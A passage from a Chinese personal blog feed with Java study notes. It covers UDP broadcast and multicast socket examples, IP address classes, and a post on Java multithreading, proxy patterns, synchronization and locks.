title="广播通信"></a>广播通信</h2><h3 id="服务端-3"><a href="#服务端-3" class="headerlink" title="服务端"></a>服务端</h3><pre class="line-numbers language-Java"><code class="language-Java">public class Sever &#123;    public static void main(String args[]) &#123;        int port = 5858;        InetAddress group = null;        MulticastSocket socket = null;        try &#123;            //创建InetAddress对象，指定广播地址            group = InetAddress.getByName("127.0.0.1");            //创建MulticastSocket对象，监听指定端口            socket = new MulticastSocket(port);            //创建InetSocketAddress对象，指定广播地址和端口            InetSocketAddress socketAddress = new InetSocketAddress(group,port);            //获取指定网卡的NetworkInterface对象            NetworkInterface networkInterface = NetworkInterface.getByInetAddress(group);            //加入广播组            socket.joinGroup(socketAddress,networkInterface);        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;        while (true) &#123;            byte data[] = new byte[8192];            DatagramPacket packet = null;            //创建DatagramPacket对象，用于接收广播内容            packet = new DatagramPacket(data,data.length,group,port);            try &#123;                socket.receive(packet);                //将接收到的字节数组转换为字符串                String message = new String(packet.getData(),0,packet.getLength());                System.out.println("接收的内容：" + message);            &#125; catch (Exception e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="客户端-3"><a href="#客户端-3" class="headerlink" title="客户端"></a>客户端</h3><pre class="line-numbers language-Java"><code class="language-Java">public class Cilent &#123;    // Broadcast    String s = "abcd";    int port = 8989;    InetAddress group = null;    MulticastSocket socket = null;    Cilent() &#123;        try &#123;            //创建InetAddress对象，指定广播地址（路由器指定的）            group = InetAddress.getByName("255.255.255.255");            //创建MulticastSocket对象，监听指定端口            //  (注意，从这里开始DatagramSocket已经变成了MulticastSocket)            socket = new MulticastSocket(port);            //设置TTL值为1，表示只在本地网络中广播，TTL值是该字段指定IP包被路由器丢弃之前允许通过的最大网段数量，1代表只能通过一个网段            socket.setTimeToLive(1);            //创建InetSocketAddress对象，指定广播地址和端口            InetSocketAddress socketAddress = new InetSocketAddress(group,port);            //获取指定网卡的NetworkInterface对象            NetworkInterface networkInterface = NetworkInterface.getByInetAddress(group);            //加入广播组            socket.joinGroup(socketAddress,networkInterface);        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;    public void play() &#123;        while (true) &#123;            try &#123;                DatagramPacket packet = null;                byte data[] = s.getBytes();                //创建DatagramPacket对象，指定发送的目标地址和端口号                packet = new DatagramPacket(data,data.length,group,port);                System.out.println(new String(data));                //发送数据                socket.send(packet);                Thread.sleep(2000);            &#125; catch (Exception e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;    public static void main(String args[]) &#123;        new Cilent().play();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="多播通信"><a href="#多播通信" class="headerlink" title="多播通信"></a>多播通信</h2><h3 id="服务器接收端程序"><a href="#服务器接收端程序" class="headerlink" title="服务器接收端程序"></a>服务器接收端程序</h3><pre class="line-numbers language-Java"><code class="language-Java">public class TestMain &#123;    private static MulticastSocket ds;   //多播套接字对象    static String multicastHost="239.0.0.255";   //多播组地址    static InetAddress receiveAddress;   //接收地址对象    public static void main(String[] args) throws IOException &#123;            // 创建多播套接字，绑定到本地的8899端口        ds = new MulticastSocket(8899);                  // 获取多播组地址        receiveAddress=InetAddress.getByName(multicastHost);                 // 将套接字加入多播组        ds.joinGroup(receiveAddress);                // 开启一个新线程，并将多播套接字对象传递给udpRunnable对象        new Thread(new udpRunnable(ds)).start();      &#125;&#125;class udpRunnable implements Runnable &#123;    MulticastSocket ds;    public udpRunnable(MulticastSocket ds) &#123;        this.ds=ds;    &#125;    public void run() &#123;            // 创建一个用于接收数据的缓冲区        byte buf[] = new byte[1024];          DatagramPacket dp = new DatagramPacket(buf, 1024);          while (true) &#123;              try &#123;                              // 从多播套接字中接收数据，并将数据存储到数据包对象中                ds.receive(dp);                                  // 打印接收到的客户端消息                System.out.println("receive client message : "+new String(buf, 0, dp.getLength()));              &#125; catch (Exception e) &#123;                  e.printStackTrace();              &#125;          &#125;      &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="客户发送端"><a href="#客户发送端" class="headerlink" title="客户发送端"></a>客户发送端</h3><pre class="line-numbers language-Java"><code class="language-Java">public class SendUdp &#123;    public static void main(String[] args) throws IOException &#123;        MulticastSocket ms=null;         DatagramPacket dataPacket = null;         ms = new MulticastSocket();                // 设置多播数据包的生存时间为32        ms.setTimeToLive(32);                  // 将字符串 "组播 测试" 转换为字节数组 data        byte[] data = "组播 测试".getBytes();                   // 获取多播组地址 address 对象        InetAddress address = InetAddress.getByName("239.0.0.255");                  // 创建数据包 dataPacket，指定数据、数据长度、目标地址和端口        dataPacket = new DatagramPacket(data, data.length, address,8899);                 // 发送数据包        ms.send(dataPacket);                  // 关闭套接字        ms.close();       &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="IP地址分级"><a href="#IP地址分级" class="headerlink" title="IP地址分级"></a>IP地址分级</h2><p>之前比赛写过这个还不是很了解，这里记一下</p><table><thead><tr><th>分类</th><th>范围</th></tr></thead><tbody><tr><td>A</td><td>0.0.0.0-127.255.255.255</td></tr><tr><td>B</td><td>128.0.0.0-191.255.255.255</td></tr><tr><td>C</td><td>192.0.0.0-223.255.255.255</td></tr><tr><td>D</td><td>224.0.0.0-239.255.255.255</td></tr><tr><td>E</td><td>240.0.0.0-255.255.255.255</td></tr></tbody></table><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>发现一个网站，大家可以<a href="https://decomytree.com/home?hashedId=3L5dBvOjX-Kd">进来玩玩</a></p><p><a href="https://smms.app/image/73ArcZKfJHBeW8o" target="_blank"><img src="https://s2.loli.net/2023/12/14/73ArcZKfJHBeW8o.jpg" width="550"></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;这篇文章我觉得我对于网络基础部分就不用再说更多了，直接一张图就够。剩下的用代码和注释来说明，看懂就是学会。&lt;/strong&gt;</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Java多线程</title>
    <link href="https://liu1272.github.io/2023/12/13/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    <id>https://liu1272.github.io/2023/12/13/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/</id>
    <published>2023-12-13T07:44:00.000Z</published>
    <updated>2023-12-14T12:46:40.296Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://smms.app/image/OWJiKn1hyEl3F9P" target="_blank"><img src="https://s2.loli.net/2023/12/14/OWJiKn1hyEl3F9P.png" ></a></p><h2 id="多线程概念"><a href="#多线程概念" class="headerlink" title="多线程概念"></a>多线程概念</h2><p><a href="https://smms.app/image/1QwXFzdknWJygA3" target="_blank"><img src="https://s2.loli.net/2023/12/14/1QwXFzdknWJygA3.jpg" ></a></p><ul><li>程序是指令和数据的集合</li><li>进程是执行程序的一次过程</li><li>线程是CPU调度执行的单位，无法人为干预</li><li>一个进程包括多个线程</li><li>分为真实多线程和模拟多线程</li></ul><h2 id="创建线程三种方式"><a href="#创建线程三种方式" class="headerlink" title="创建线程三种方式"></a>创建线程三种方式</h2><h3 id="【一】继承Thread类"><a href="#【一】继承Thread类" class="headerlink" title="【一】继承Thread类"></a>【一】继承Thread类</h3><ol><li>自定义线程类继承Thread类</li><li>重写run()方法，编写线程执行体</li><li>创建线程对象，调用start()方法启动线程</li></ol><pre class="line-numbers language-Java"><code class="language-Java">public class Main &#123;    public static void main(String[] args) &#123;        Thread t = new MyThread();   // 创建线程对象        t.start();  // 调用start()方法启动线程    &#125;&#125;class MyThread extends Thread &#123;    // 自定义线程类继承Thread类    @Override    public void run() &#123;    // 重写run()方法，编写线程执行体        System.out.println("start new thread!");    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="【二】实现Runnable接口"><a href="#【二】实现Runnable接口" class="headerlink" title="【二】实现Runnable接口"></a>【二】实现Runnable接口</h3><ol><li>定义MyRunnable类实现Runnable接口</li><li>实现run()方法，编写线程执行体</li><li>创建线程对象，调用start()方法启动线程</li><li>推荐使用Runnable对象，因为Java单继承的局限性</li></ol><pre class="line-numbers language-Java"><code class="language-Java">public class Main &#123;    public static void main(String[] args) &#123;        Thread t = new Thread(new MyRunnable());   // 创建线程对象        t.start(); // 调用start()方法启动线程    &#125;&#125;class MyRunnable implements Runnable &#123;   // 定义MyRunnable类实现Runnable接口    @Override    public void run() &#123;   // 实现run()方法，编写线程执行体        System.out.println("start new thread!");    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="【三】通过-Callable-和-Future-创建线程"><a href="#【三】通过-Callable-和-Future-创建线程" class="headerlink" title="【三】通过 Callable 和 Future 创建线程"></a>【三】通过 Callable 和 Future 创建线程</h3><ol><li>实现Callable接口，需要返回值类型</li><li>重写call方法，需要抛出异常</li><li>创建目标对象</li><li>创建执行服务:ExecutorService ser = Executors.newFixedThreadPool(1);</li><li>提交执行: Future&lt; Boolean &gt; result1 = ser.submit(t1);</li><li>获取结果: boolean r1 = result1.get()</li><li>关闭服务: ser.shutdownNow();</li><li>上两个方法在执行完任务之后无法获取执行结果，执行失败也不会抛出异常（得要通过共享变量或者使用线程通信的方式才能实现）</li><li>Callable接口代表一段可以调用并返回结果的代码;Future接口表示异步任务，是还没有完成的任务给出的未来结果。所以说Callable用于产生结果，Future用于获取结果</li></ol><pre class="line-numbers language-Java"><code class="language-Java">import java.util.concurrent.*;public class java01 &#123;    ExecutorService executorService = Executors.newCachedThreadPool();    Future<Integer> submit = executorService.submit(new Callable<Integer>() &#123;        @Override        public Integer call() throws Exception &#123;            return null;        &#125;    &#125;);    Callable<Integer> callable = new Callable<Integer>() &#123;        @Override        public Integer call() throws Exception &#123;            return null;        &#125;    &#125;;    FutureTask<Integer> integerFutureTask = new FutureTask<>(callable);&#125;new Thread(integerFutureTask).start();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>推荐使用实现Runnable接口的方法来创建线程，可以避免Java单继承的局限性，同时操作同个对象</strong><br><strong>但是正因为同时操作了同个对象，导致了线程安全问题</strong></p><h2 id="Java三种代理模式"><a href="#Java三种代理模式" class="headerlink" title="Java三种代理模式"></a>Java三种代理模式</h2><p>代理模式是一种设计模式，提供了对目标对象额外的访问方式，即通过代理对象访问目标对象，这样可以在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能。</p><p>简言之，代理模式就是设置一个中间代理来控制访问原目标对象，以达到增强原对象的功能和简化访问方式。</p><h3 id="【静态代理】"><a href="#【静态代理】" class="headerlink" title="【静态代理】"></a><strong>【静态代理】</strong></h3><p>这种代理方式需要<strong>代理对象和目标对象实现一样的接口</strong>。<br>优点：可以在不修改目标对象的前提下扩展目标对象的功能。<br>缺点：</p><pre><code>冗余。由于代理对象要实现与目标对象一致的接口，会产生过多的代理类。不易维护。一旦接口增加方法，目标对象与代理对象都要进行修改。</code></pre><pre class="line-numbers language-Java"><code class="language-Java">public interface IUserDao &#123;  // 接口类： IUserDao    public void save();  // 定义接口方法&#125;public class UserDao implements IUserDao&#123;  // 目标对象：UserDao    @Override    public void save() &#123;  // 实现目标对象的接口方法        System.out.println("保存数据");    &#125;&#125; public class UserDaoProxy implements IUserDao&#123; // 静态代理对象：UserDapProxy 需要实现IUserDao接口！    private IUserDao target;    public UserDaoProxy(IUserDao target) &#123;        this.target = target;    &#125;        @Override    public void save() &#123;  // 实现代理对象的接口方法        System.out.println("开启事务");  //扩展了额外功能        target.save();        System.out.println("提交事务");    &#125;&#125;public class StaticUserProxy &#123;  // 测试类：TestProxy    @Test    public void testStaticProxy()&#123;        //目标对象        IUserDao target = new UserDao();        //代理对象        UserDaoProxy proxy = new UserDaoProxy(target);        proxy.save();  // 调用代理对象的方法    &#125;&#125;输出结果:  开启事务  保存数据  提交事务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="【动态代理】"><a href="#【动态代理】" class="headerlink" title="【动态代理】"></a><strong>【动态代理】</strong></h3><p>动态代理利用了JDK API，动态地在内存中构建代理对象，从而实现对目标对象的代理功能。动态代理又被称为JDK代理或接口代理。</p><p>静态代理与动态代理的区别主要在：</p><pre><code>静态代理在编译时就已经实现，编译完成后代理类是一个实际的class文件动态代理是在运行时动态生成的，即编译完成后没有实际的class文件，而是在运行时动态生成类字节码，并加载到JVM中</code></pre><p>特点：<br>动态代理对象不需要实现接口，但是要求<strong>目标对象必须实现接口</strong>，否则不能使用动态代理。</p><pre class="line-numbers language-Java"><code class="language-Java">public interface IUserDao &#123;  // 接口类： IUserDao    public void save();  // 定义接口方法&#125;public class UserDao implements IUserDao&#123;  // 目标对象：UserDao    @Override    public void save() &#123;  // 实现目标对象的接口方法        System.out.println("保存数据");    &#125;&#125;public class ProxyFactory &#123;    private Object target;// 维护一个目标对象    public ProxyFactory(Object target) &#123;        this.target = target;    &#125;    // 为目标对象生成代理对象    public Object getProxyInstance() &#123;        return Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(),                new InvocationHandler() &#123;                    @Override                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;                        System.out.println("开启事务");                        // 执行目标对象方法                        Object returnValue = method.invoke(target, args);                        System.out.println("提交事务");                        return null;                    &#125;                &#125;);    &#125;&#125;public class TestProxy &#123;    @Test    public void testDynamicProxy ()&#123;        IUserDao target = new UserDao();        System.out.println(target.getClass());  //输出目标对象信息        IUserDao proxy = (IUserDao) new ProxyFactory(target).getProxyInstance();        System.out.println(proxy.getClass());  //输出代理对象信息        proxy.save();  //执行代理方法    &#125;&#125;输出结果:  开启事务  保存数据  提交事务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="【cglib代理】"><a href="#【cglib代理】" class="headerlink" title="【cglib代理】"></a><strong>【cglib代理】</strong></h3><p>cglib 是一个第三方代码生成类库，运行时在内存中动态生成一个子类对象从而实现对目标对象功能的扩展。</p><p>cglib特点：<strong>无需实现接口</strong></p><pre><code>JDK的动态代理有一个限制，就是使用动态代理的对象必须实现一个或多个接口。如果想代理没有实现接口的类，就可以使用CGLIB实现。CGLIB是一个强大的高性能的代码生成包，它可以在运行期扩展Java类与实现Java接口。它广泛的被许多AOP的框架使用，例如Spring AOP和dynaop，为他们提供方法的interception（拦截）。CGLIB包的底层是通过使用一个小而快的字节码处理框架ASM，来转换字节码并生成新的类。不鼓励直接使用ASM，因为它需要你对JVM内部结构包括class文件的格式和指令集都很熟悉。</code></pre><p>cglib与动态代理最大的区别就是</p><pre><code>使用动态代理的对象必须实现一个或多个接口使用cglib代理的对象则无需实现接口，达到代理类无侵入。</code></pre><pre class="line-numbers language-Java"><code class="language-Java">public class UserDao&#123;    public void save() &#123;        System.out.println("保存数据");    &#125;&#125;public class ProxyFactory implements MethodInterceptor&#123;    private Object target;//维护一个目标对象    public ProxyFactory(Object target) &#123;        this.target = target;    &#125;        //为目标对象生成代理对象    public Object getProxyInstance() &#123;        //工具类        Enhancer en = new Enhancer();        //设置父类        en.setSuperclass(target.getClass());        //设置回调函数        en.setCallback(this);        //创建子类对象代理        return en.create();    &#125;    @Override    public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable &#123;        System.out.println("开启事务");        // 执行目标对象的方法        Object returnValue = method.invoke(target, args);        System.out.println("关闭事务");        return null;    &#125;&#125;public class TestProxy &#123;    @Test    public void testCglibProxy()&#123;        //目标对象        UserDao target = new UserDao();        System.out.println(target.getClass());        //代理对象        UserDao proxy = (UserDao) new ProxyFactory(target).getProxyInstance();        System.out.println(proxy.getClass());        //执行代理对象方法        proxy.save();    &#125;&#125;输出结果:  开启事务  保存数据  关闭事务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>静态代理实现较简单，只要代理对象对目标对象进行包装，即可实现增强功能，但静态代理只能为一个目标对象服务，如果目标对象过多，则会产生很多代理类。</li><li>JDK动态代理需要目标对象实现业务接口，代理类只需实现InvocationHandler接口。</li><li>静态代理在编译时产生class字节码文件，可以直接使用，效率高。</li><li>动态代理必须实现InvocationHandler接口，通过反射代理方法，比较消耗系统性能，但可以减少代理类的数量，使用更灵活。</li><li>cglib代理无需实现接口，通过生成类字节码实现代理，比反射稍快，不存在性能问题，但cglib会继承目标对象，需要重写方法，所以目标对象不能为final类。</li></ol><h2 id="Lambda表达式"><a href="#Lambda表达式" class="headerlink" title="Lambda表达式"></a>Lambda表达式</h2><p>使用Lambda表达式替换单方法接口：</p><pre class="line-numbers language-Java"><code class="language-Java">Arrays.sort(array, new Comparator<String>() &#123;    public int compare(String s1, String s2) &#123;        return s1.compareTo(s2);    &#125;&#125;);上面的可变为下面的形式Arrays.sort(array, (s1, s2) -> &#123;    return s1.compareTo(s2);&#125;);参数是(s1, s2)，参数类型可以省略，因为编译器可以自动推断出String类型。-> &#123; ... &#125;表示方法体，所有代码写在内部即可。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果只有一行return xxx的代码，完全可以用更简单的写法：</p><pre class="line-numbers language-Java"><code class="language-Java">Arrays.sort(array, (s1, s2) -> s1.compareTo(s2));返回值的类型也是由编译器自动推断的，这里推断出的返回值是int，因此，只要返回int，编译器就不会报错。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="线程五大状态"><a href="#线程五大状态" class="headerlink" title="线程五大状态"></a>线程五大状态</h2><p><a href="https://smms.app/image/ahJjMVtcqdRIEPf" target="_blank"><img src="https://s2.loli.net/2023/12/14/ahJjMVtcqdRIEPf.jpg" ></a><br><a href="https://smms.app/image/c8B1KWYHNpOdmb2" target="_blank"><img src="https://s2.loli.net/2023/12/14/c8B1KWYHNpOdmb2.jpg" ></a></p><h3 id="线程停止"><a href="#线程停止" class="headerlink" title="线程停止"></a>线程停止</h3><p>不推荐使用JDK提供的 stop()、destroy()方法。<br>推荐线程自己停止下来，使用一个标志位进行终止变量（当flag=false终止线程运行）</p><h3 id="线程休眠"><a href="#线程休眠" class="headerlink" title="线程休眠"></a>线程休眠</h3><p>sleep(时间)指定当前线程阻塞的毫秒数<br>sleep存在异常InterruptedException;<br>sleep时间达到后线程进入就绪状态<br>sleep可以模拟网络延时，倒计时等<br>每一个对象都有一个锁，sleep不会释放锁</p><h3 id="线程礼让"><a href="#线程礼让" class="headerlink" title="线程礼让"></a>线程礼让</h3><p>礼让线程，让当前正在执行的线程暂停，但不阻塞<br>将线程从运行状态转为就绪状态<br>让cpu重新调度，礼让不一定成功!看CPU心情</p><h3 id="线程强制执行"><a href="#线程强制执行" class="headerlink" title="线程强制执行"></a>线程强制执行</h3><p>Join合并线程，待此线程执行完成后，再执行其他线程，其他线程阻塞</p><h3 id="线程优先级"><a href="#线程优先级" class="headerlink" title="线程优先级"></a>线程优先级</h3><p>Java提供一个线程调度器来监控程序中启动后进入就绪状态的所有线程，线程调度器按照优先级决定应该调度哪个线程来执行线程的优先级用数字表示，范围从1~10.<br><code>Thread.MIN PRIORITY = 1;</code><br>使用以下方式改变或获取优先级</p><pre><code>getPriority() . setPriority(int xxx)</code></pre><h3 id="守护线程"><a href="#守护线程" class="headerlink" title="守护线程"></a>守护线程</h3><p>线程分为用户线程和守护线程<br>虚拟机必须确保<strong>用户线程</strong>执行完毕<br>虚拟机不用等待<strong>守护线程</strong>执行完毕</p><pre><code>thread.setDaemon(true); //默认是false表示是用户线程 ，正常的线程都是用户线程</code></pre><h2 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h2><p>实现要求：队列+锁<br>由于同一进程的多个线程共享同一块存储空间，导致访问冲突问题<br>为了保证数据在方法中被访问时的正确性，在访问时加入锁机制<code>synchronized</code><br>加锁释放锁会导致比较多的上下文切换和调度延时起性能问题<br>但是一个优先级高的线程等待一个优先级低的线程释放锁会导致优先级倒置，引起性能问题</p><h3 id="同步方法和同步块"><a href="#同步方法和同步块" class="headerlink" title="同步方法和同步块"></a>同步方法和同步块</h3><p>同步方法:<br><code>public synchronized void method(int args) &#123;&#125;</code><br>每个对象对应一把锁每个synchronized方法都必须获得调用该方法的对象的锁才能执行<br>缺陷:若将一个大的方法申明为synchronized 将会影响效率</p><p>同步块:<br><code>synchronized (obj) &#123;&#125;</code><br>obj 可以是任何对象，但是推荐使用共享资源作为同步监视器（obj）<br>同步方法中无需指定同步监视器（obj），因为同步方法的同步监视器就是this，就是这个对象本身</p><ol><li>第一个线程访问，锁定同步监视器，执行其中代码</li><li>第二个线程访问，发现同步监视器被锁定，无法访问</li><li>第一个线程访问完毕，解锁同步监视器</li><li>第二个线程访问，发现同步监视器没有锁，然后锁定并访问</li></ol><p>对于普通同步方法，锁是当前实例对象。如果有多个实例,那么锁对象必然不同无法实现同步。<br>对于静态同步方法，锁是当前类的Class对象。有多个实例但是锁对象是相同的,可以完成同步。<br>对于同步方法块，锁是Synchonized括号里配置的对象。如当前类的class只有一个,锁对象相同 也能实现同步。</p><h2 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h2><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p>多个线程各自占有一些共享资源，并且互相等待其他线程占有的资源才能运行<br>而某一个同步块同时拥有“两个以上对象的锁”导致两个或者多个线程都在等待对方释放资源，都停止执行的情形时，就可能会发生“死锁”的问题</p><p>产生死锁的四个必要条件：</p><ol><li>互斥条件:一个资源每次只能被一个进程使用。</li><li>请求与保持条件:一个进程因请求资源而阻塞时，对已获得的资源保持不放</li><li>不剥夺条件:进程已获得的资源，在末使用完之前，不能强行剥夺</li><li>循环等待条件:若千进程之间形成一种头尾相接的循环等待资源关系</li></ol><p>只要打破以上的任意一个条件就能解除死锁。</p><h3 id="Lock锁"><a href="#Lock锁" class="headerlink" title="Lock锁"></a>Lock锁</h3><p>从JDK5.0开始Java提供了更强大的线程同步机制-通过显式定义同步锁对象来实现同步。同步锁使用Lock对象实现。<br>锁提供了对共享资源的独占访问，每次只能有一个线程对Lock对象加锁，线程开始访问共享资源之前应先获得Lock对象<br>ReentrantLock（可重入锁）拥有与synchronized 相同的并发性和内存语义，在实现线程安全的控制中较常用，可以显式加锁、释放锁。</p><p>使用示例：</p><pre class="line-numbers language-Java"><code class="language-Java">public void testMethod() &#123;    lock.lock();    try &#123;        System.out.println("xxxxxxxxxxxxxxxxx");    &#125; finally &#123;        lock.unlock();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Lock与Synchronized的比较"><a href="#Lock与Synchronized的比较" class="headerlink" title="Lock与Synchronized的比较"></a>Lock与Synchronized的比较</h3><ul><li>Lock是显式锁(手动开启和关闭锁，别忘记关闭锁)synchronized是隐式锁，出了作用域自动释放</li><li>Lock只有代码块锁，synchronized有代码块锁和方法锁使用Lock锁，JVM将花费较少的时间来调度线程，性能更好。并且具有更好的扩展性(提供更多的子类)</li><li><strong>优先使用顺序:</strong></li><li>Lock &gt;同步代码块 (已经进入了方法体，分配了相应资源)&gt;同步方法 (在方法体之外)</li></ul><h2 id="生产者消费者问题"><a href="#生产者消费者问题" class="headerlink" title="生产者消费者问题"></a>生产者消费者问题</h2><h3 id="问题概述"><a href="#问题概述" class="headerlink" title="问题概述"></a>问题概述</h3><p>生产者和消费者共享同一个资源，并且生产者和消费者之间相互依赖，互为条件<br><strong>对于生产者：</strong>没有生产产品之前，要通知消费者等待而生产了产品之后，又需要马上通知消费者消费<br><strong>对于消费者：</strong>在消费之后，要通知生产者已经结束消费，需要生产新的产品以供消费</p><ul><li>synchronized 可阻止并发更新同一个共享资源，实现了同步</li><li>synchronized 不能用来实现不同线程之间的消息传递(通信)</li></ul><p>解决通信问题的方法，都是Obj类方法，只能在同步方法或者同步方法块内。</p><table><thead><tr><th>方法名</th><th>作用</th></tr></thead><tbody><tr><td>wait()</td><td>表示线程一直等待，直到其他线程通知，与sleep不同会释放锁</td></tr><tr><td>wait(long timeout)</td><td>指定等待的毫秒数</td></tr><tr><td>notify()</td><td>唤醒一个处于等待状态的线程</td></tr><tr><td>notifyAll()</td><td>唤醒同一个对象上所有调用wait()方法的线程，优先级别高的线程优先调度</td></tr></tbody></table><h3 id="管程法"><a href="#管程法" class="headerlink" title="管程法"></a>管程法</h3><p>使用wait()和notify()方法的实现</p><p><strong>生产者:</strong> 负责生产数据的模块(可能是方法，对象，线程，进程)<br><strong>消费者:</strong> 负责处理数据的模块(可能是方法，对象，线程，进程)<br><strong>缓冲区:</strong> 生产者将生产好的数据放入缓冲区，消费者从缓冲区拿出数据</p><p>缓冲区满或者空时都调用wait()方法等待，当生产者生产了一个产品或者消费者消费了一个产品之后会唤醒所有线程。</p><h3 id="可重入锁ReentrantLock的实现"><a href="#可重入锁ReentrantLock的实现" class="headerlink" title="可重入锁ReentrantLock的实现"></a>可重入锁ReentrantLock的实现</h3><p>可重入锁，也叫做递归锁，指的是同一线程 外层函数获得锁之后，内层递归函数仍然有获取该锁的代码，但不受影响。<br>锁维护一个与获取锁相关的计数器，如果拥有锁的某个线程再次得到锁，那么获取计数器就加1，函数调用结束计数器就减1。<br>锁需要被释放两次才能获得真正释放，已经获取锁的线程进入其他需要相同锁的同步代码块不会被阻塞。</p><h3 id="阻塞队列BlockingQueue的实现"><a href="#阻塞队列BlockingQueue的实现" class="headerlink" title="阻塞队列BlockingQueue的实现"></a>阻塞队列BlockingQueue的实现</h3><p>BlockinoQueue是一个已经在内部实现了同步的队列，实现方式采用的是await()/signal()方法。它可以在生成对象时指定容量大小，用于阻塞操作的是put()和take()方法。<br>put()方法: 类似于我们上面的生产者线程，容量达到最大时，自动阻塞。<br>take(方法: 类似于我们上面的消费者线程，容量为0时，自动阻寒。<br>当一个线程对已经满了的阻塞队列进行入队操作时会阻塞，除非有另外一个线程进行了出队操作，当一个线程对一个空的阻塞队列进行出队操作时也会阻塞，除非有另外一个线程进行了入队操作。<br>从上可知，阻塞队列是线程安全的。</p><h3 id="信号量-Semaphore-的实现"><a href="#信号量-Semaphore-的实现" class="headerlink" title="信号量 Semaphore 的实现"></a>信号量 Semaphore 